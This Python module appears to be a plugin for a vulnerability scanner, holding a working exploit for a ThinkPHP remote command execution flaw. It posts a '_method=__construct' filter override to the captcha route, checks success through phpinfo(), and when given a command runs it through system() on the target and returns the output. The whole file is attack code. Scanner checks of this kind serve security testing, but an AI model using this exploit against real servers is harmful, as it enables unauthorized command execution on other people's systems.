# -*- coding:utf-8 -*-
# Thinkphp debug命令执行

from .. import requestUtil
import html

def thinphp_debug(url, cmd=""):
    try:
        if cmd == "":
            resp = requestUtil.post(url+"/index.php?s=captcha", data={
                "_method":"__construct",
                "filter[]":"phpinfo",
                "method":"get",
                "server[REQUEST_METHOD]":1
            })
            if "http://www.php.net/" in resp.text:
                return ["Thinkphp debug命令执行", "phpinfo() is executed"]
            else:
                return []
        else:
            resp = requestUtil.post(url + "/index.php?s=captcha", data={
                "_method": "__construct",
                "filter[]": "system",
                "method": "get",
                "server[REQUEST_METHOD]": cmd
            })
            return "".join(resp.text.split("<!DOCTYPE html>")[:-1])
    except:
        return []

def fingerprint(service):
    if service.url:
        return True

def poc(service):
    return thinphp_debug(service.url)